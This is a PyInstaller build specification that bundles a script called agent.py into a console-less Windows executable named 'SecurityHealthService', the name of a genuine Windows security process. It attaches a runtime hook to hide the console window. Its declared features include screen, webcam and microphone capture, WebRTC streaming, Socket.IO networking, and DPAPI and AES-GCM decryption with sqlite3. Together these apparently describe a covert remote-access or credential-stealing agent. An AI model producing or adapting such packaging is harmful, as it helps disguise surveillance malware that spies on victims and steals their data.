# -*- mode: python ; coding: utf-8 -*-
"""
Professional PyInstaller Specification File for agent.py
Generates a standalone executable (SecurityHealthService.exe) bundled with all 
runtime binaries, C extensions, DLLs, hidden imports, and package metadata.
Engineered to build and run seamlessly across different laptops and Windows environments.
"""

import os
import sys
import site
from PyInstaller.utils.hooks import (
    collect_all,
    collect_submodules,
    collect_data_files,
    collect_dynamic_libs,
    copy_metadata
)

# 1. Base Setup & Robust Dynamic Path Resolution
try:
    agent_dir = os.path.abspath(SPECPATH)
except NameError:
    agent_dir = os.path.dirname(os.path.abspath(__file__)) if '__file__' in locals() else os.path.dirname(os.path.abspath('agent.spec'))

if agent_dir not in sys.path:
    sys.path.insert(0, agent_dir)

agent_script = os.path.join(agent_dir, 'agent.py')
runtime_hook_path = os.path.join(agent_dir, 'hook-hideconsole.py')
version_path = os.path.join(agent_dir, 'version.txt')

print(f"[*] Base directory: {agent_dir}")
print(f"[*] Agent script:   {agent_script}")

datas = []
binaries = []
hiddenimports = []

# 2. Comprehensive Dynamic Package Collection
# Ensures all data files, C extensions, DLLs, and submodules for heavy packages are collected.
packages_to_collect = [
    'aiortc',
    'av',
    'pyaudio',
    'cv2',
    'numpy',
    'mss',
    'dxcam',
    'socketio',
    'engineio',
    'cryptography',
    'cffi',
    '_cffi_backend',
    'windows',
    'psutil',
    'aioice',
    'pylibsrtp',
    'pyee',
    'websockets',
    'websocket',
    'certifi',
    'tkinter',
]

for pkg in packages_to_collect:
    try:
        d, b, h = collect_all(pkg)
        datas += d
        binaries += b
        hiddenimports += h
        print(f"[+] Collected package: {pkg}")
    except Exception as e:
        print(f"[!] Notice: optional package '{pkg}' not collected: {e}")

# 3. Package Metadata Collection
# Required for packages that check importlib.metadata or pkg_resources at runtime.
metadata_packages = [
    'requests',
    'python-socketio',
    'python-engineio',
    'cryptography',
    'urllib3',
    'idna',
    'certifi',
    'charset_normalizer',
    'pyaudio',
    'av',
    'aiortc',
    'numpy',
    'psutil',
    'websockets',
]

for pkg in metadata_packages:
    try:
        datas += copy_metadata(pkg)
        print(f"[+] Collected metadata: {pkg}")
    except Exception as e:
        pass

# 4. PyWin32 & Windows CRT / System DLL Auto-Detection
# Collects pywintypes*.dll, pythoncom*.dll, win32 .pyd extensions, and VC++ runtime DLLs.
search_dirs = list(sys.path)
try:
    for p in site.getsitepackages():
        if p and p not in search_dirs:
            search_dirs.append(p)
except Exception:
    pass

try:
    user_site = site.getusersitepackages()
    if user_site and user_site not in search_dirs:
        search_dirs.append(user_site)
except Exception:
    pass

for p in [sys.prefix, getattr(sys, 'base_prefix', sys.prefix)]:
    if p and p not in search_dirs:
        search_dirs.append(p)

win32_targets = []
for base_path in search_dirs:
    if not os.path.isdir(base_path):
        continue
    for sub in ['', 'win32', 'win32\\lib', 'pywin32_system32', 'win32com', 'DLLs', 'tcl']:
        target_dir = os.path.join(base_path, sub) if sub else base_path
        if os.path.isdir(target_dir) and target_dir not in win32_targets:
            win32_targets.append(target_dir)

# Gather PyWin32, Tkinter, and CRT DLLs
for target_dir in win32_targets:
    try:
        for f in os.listdir(target_dir):
            full_path = os.path.join(target_dir, f)
            f_lower = f.lower()
            if os.path.isfile(full_path):
                # PyWin32 DLLs and pyd extensions
                if f_lower.endswith(('.dll', '.pyd')):
                    binaries.append((full_path, '.'))
                    if 'pywin32_system32' in target_dir or 'pywintypes' in f_lower or 'pythoncom' in f_lower:
                        binaries.append((full_path, 'pywin32_system32'))
                # Visual C++ CRT runtime DLLs (ensures execution on fresh Windows installations)
                elif f_lower.startswith(('vcruntime140', 'msvcp140', 'vcomp140', 'ucrtbase')) and f_lower.endswith('.dll'):
                    binaries.append((full_path, '.'))
    except Exception:
        pass

# 5. Explicit Hidden Imports Coverage for agent.py Features
explicit_hiddenimports = [
    # Win32 / Windows APIs & DPAPI
    'win32api', 'win32con', 'win32process', 'win32security',
    'win32file', 'win32gui', 'win32print', 'win32com', 'win32com.client',
    'win32com.gen_py', 'win32com.server', 'win32crypt', 'pywintypes', 'pythoncom', 'winreg',
    'ctypes', 'ctypes.wintypes', 'winsound',
    
    # Windows package (PythonForWindows / hakril)
    'windows', 'windows.crypto', 'windows.generated_def',
    'windows.winproxy', 'windows.rpc', 'windows.winobject', 'windows.debug',
    
    # Process & System Metrics
    'psutil', 'psutil._psutil_windows', 'psutil._psutil_common',
    
    # Cryptography & Security (AES-GCM / ChaCha20-Poly1305 / CNG)
    'cryptography', 'cryptography.hazmat.primitives.ciphers.aead',
    'cryptography.hazmat.primitives.ciphers.aead.AESGCM',
    'cryptography.hazmat.primitives.ciphers.aead.ChaCha20Poly1305',
    'cryptography.hazmat.bindings._rust', '_cffi_backend', 'cffi',
    
    # Vision & Screen Capture
    'cv2', 'cv2.cv2', 'mss', 'mss.windows', 'mss.base', 'mss.exception',
    'dxcam', 'dxcam.core', 'dxcam.processor',
    'numpy', 'numpy.core._multiarray_umath', 'numpy.core._methods',
    'numpy.lib.format', 'numpy.fft',
    
    # Socket.IO Client & Networking
    'socketio', 'socketio.client', 'engineio', 'engineio.client',
    'engineio.async_drivers', 'engineio.async_drivers.threading',
    'simple_websocket', 'websocket', 'websockets',
    'requests', 'urllib3', 'idna', 'certifi', 'charset_normalizer',
    
    # WebRTC Streaming & Media Codecs
    'aiortc', 'aiortc.mediastreams', 'aiortc.sdp', 'aiortc.codecs', 'aiortc.rtp',
    'aiortc.codecs.opus', 'aiortc.codecs.vpx', 'aiortc.codecs.h264',
    'av', 'av.audio', 'av.video', 'av.container', 'av.codec', 'av.format',
    'av.packet', 'av.subtitles', 'av.audio.frame', 'av.audio.resampler',
    'av.audio.fifo', 'av.audio.format', 'av.audio.layout',
    'aioice', 'pylibsrtp', 'pyee',
    
    # Audio Capture
    'pyaudio', '_portaudio', 'wave',
    
    # GUI & Alert Dialogs (Custom glowing messagebox)
    'tkinter', '_tkinter', 'tkinter.ttk', 'tkinter.messagebox', 'tkinter.font',
    
    # Database, XML, Regex, & Core Standard Libraries
    'sqlite3', '_sqlite3', 'queue', 'threading', 'subprocess', 'shutil',
    'tempfile', 'pathlib', 'io', 'struct', 'webbrowser', 'atexit', 'hashlib',
    'configparser', 'argparse', 'base64', 'json', 'logging', 'contextlib',
    'platform', 'signal', 'socket', 'uuid', 'fractions', 'asyncio',
    're', 'xml.etree.ElementTree', 'string', 'datetime', 'zipfile'
]

hiddenimports = list(dict.fromkeys(hiddenimports + explicit_hiddenimports))

# 6. Deduplicate Datas and Binaries
unique_datas = []
seen_datas = set()
for src, dst in datas:
    if os.path.exists(src):
        key = (os.path.normpath(src), dst)
        if key not in seen_datas:
            seen_datas.add(key)
            unique_datas.append((src, dst))
datas = unique_datas

unique_binaries = []
seen_binaries = set()
for src, dst in binaries:
    if os.path.exists(src):
        key = (os.path.normpath(src), dst)
        if key not in seen_binaries:
            seen_binaries.add(key)
            unique_binaries.append((src, dst))
binaries = unique_binaries

# 7. Runtime Hook (Console Suppressor)
runtime_hooks = []
if os.path.exists(runtime_hook_path):
    runtime_hooks.append(runtime_hook_path)
    print(f"[+] Attached runtime hook: {runtime_hook_path}")

# 8. Analysis Stage
a = Analysis(
    [agent_script],
    pathex=[agent_dir],
    binaries=binaries,
    datas=datas,
    hiddenimports=hiddenimports,
    hookspath=[],
    hooksconfig={},
    runtime_hooks=runtime_hooks,
    excludes=[
        'test', 'unittest', 'setuptools', 'pip',
        'PyQt5', 'PyQt6', 'PySide2', 'PySide6', 'IPython', 'jupyter', 'matplotlib'
    ],
    noarchive=False,
)

# 9. PYZ Archive
pyz = PYZ(a.pure)

# 10. Standalone EXE Construction
exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='SecurityHealthService',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=False,  # Disabling UPX prevents WinError 1114 / DLL initialization crashes with C-extensions (PyAV, OpenCV, Rust crypto)
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    version=version_path if os.path.exists(version_path) else None
)
